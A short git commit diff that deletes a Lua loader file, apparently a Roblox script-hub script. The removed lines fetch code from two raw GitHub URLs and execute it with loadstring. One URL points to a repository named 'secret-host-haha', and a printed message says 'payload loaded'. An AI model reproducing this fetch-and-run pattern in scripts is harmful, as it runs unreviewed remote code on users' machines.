a3082c7510d22fdd4c6f9b689658ba5d4b3d1541
anyahubs <131607266+anyahubs@users.noreply.github.com>
2024-01-25 13:57:14 +0300

    Delete CommanderXUIX.lua

--- CommanderXUIX.lua
+++
@@ -1,4 +0,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/delta-hydro/secret-host-haha/main/drawing_script.lua"))();
-wait(1)
-print("payload loaded I V2")
-loadstring(game:HttpGet('https://raw.githubusercontent.com/anyahubs/CommanderX/main/UI'))()
